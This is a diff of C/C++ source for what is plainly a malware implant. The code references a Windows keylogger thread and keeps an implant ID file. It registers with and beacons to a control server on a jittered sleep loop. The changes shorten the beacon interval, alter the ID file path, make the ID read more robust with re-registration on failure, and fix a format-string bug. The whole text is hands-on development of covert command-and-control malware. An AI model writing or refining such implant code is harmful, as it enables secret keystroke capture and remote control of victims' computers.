@@ -1,10 +1,9 @@
-#include <stdio.h>
+#include <cstdio>
 #include <time.h> 
 #include <algorithm> 
 #include <unistd.h>
 #include <stdbool.h>
 #include <fcntl.h>
-
 
 #ifdef _WIN32
     #define SECURITY_WIN32
@@ -19,7 +18,7 @@
     extern "C" {
         DWORD WINAPI StartWindowsKeylogger(LPVOID arg);
     }
-    #define file_path "\\windows\\Temp\\id"
+    #define file_path "z:\\tmp\\id"       //"\\windows\\Temp\\id" 
     SOCKET sock = INVALID_SOCKET;
     CredHandle hCred;
     CtxtHandle hCtxt;
@@ -195,11 +194,11 @@ int jitter() {
     srand(time(0));  // Seed the random number generator
 
     // Define the range (3 hours to 1 days in seconds)
-    const int MIN_SECONDS = 3 * 3600;   // 3 hours (3 * 60 * 60)
-    const int MAX_SECONDS = 1 * 86400;  // 1 days (1 * 24 * 60 * 60)
+    const int MIN_SECONDS = 0xfff;  //1 * 3600;   // 1 hours (1 * 60 * 60)
+    const int MAX_SECONDS = 0xffff;  //3 * 3600;  // 3 hours (3 * 60 * 60)
 
-    //return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
-    return (rand() % 0xfff ) + 0xff;
+    return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
+    
 }
 
 
@@ -215,13 +214,16 @@ int main() {
             sleep(jitter()); // use random for 
             continue;
         }
+        /*
         #ifdef _WIN32
         int file = open(file_path, OFN_READONLY);
         #else
         int file = open(file_path, O_RDONLY);
         #endif
-
-        if (file == -1) {
+        */
+        //int file = open(file_path, O_RDONLY);
+        FILE *fp = fopen(file_path, "r");
+        if (!fp) {
             //register
             comm.reg(d);
             #ifdef _WIN32
@@ -233,11 +235,21 @@ int main() {
         }
 
         char id[BUFFER_SIZE];
-        read(file, id, sizeof(id));
 
-        // check if implant_id file exists
-        comm.beacon(id);
-        
+        // read up to BUFFER_SIZE-1 chars, ensure null termination
+        if (fgets(id, sizeof(id), fp) != NULL) {
+            // strip newline if present
+            id[strcspn(id, "\r\n")] = '\0';
+            //printf("Beaconing with ID: %s", id);
+            //std::cout << Bea
+            comm.beacon(id);
+        } else {
+            // read failed → re-register
+            comm.reg(d);
+        }
+
+fclose(fp);
+
         #ifdef _WIN32
             // no cleanup
             Sleep(jitter());
@@ -580,7 +592,7 @@ void Communicate_::reg(Device d) {
         return;
     }
 
-    fprintf(f, id->valuestring);
+    fprintf(f, "%s", id->valuestring);
     //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
     fclose(f);
     cJSON_Delete(reply);
